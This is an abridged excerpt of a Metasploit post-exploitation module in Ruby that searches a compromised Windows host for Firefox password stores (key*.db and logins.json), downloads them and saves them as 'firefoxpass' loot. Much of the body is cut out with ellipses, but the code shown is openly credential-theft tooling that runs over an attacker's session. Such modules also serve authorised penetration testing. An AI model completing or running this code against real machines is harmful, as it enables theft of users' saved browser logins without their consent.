...
##
# Based on enum_files created by: 3vi1john <Jbabio[at]me.com>  & RageLtMan <rageltman[at]sempervictus>
# All credits to the creators of enum_files.
...
class MetasploitModule < Msf::Post
  ...
  def initialize(info={})
    super( update_info( info,
      ...
      'Description'   => %q{
        Based on enum_files. This module searches and downloads firefox passwords.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
    ...
    register_options(
      [
        OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\', 'C:/']),
        OptString.new('FILE_GLOBS',  [ true, 'Filename for decrypt file. Ex. key3.db', 'key*.db']),
        OptString.new('FILE_GLOBS2',  [ true, 'File name for logins file. Ex. logins.json', 'logins.json'])
      ])
  end
  ...
  def download_files(location, file_type)
    ...
    getfile.each do |file|
      ...
      p = store_loot("firefoxpass", 'application/octet-stream', session, data, file['name'], filename)
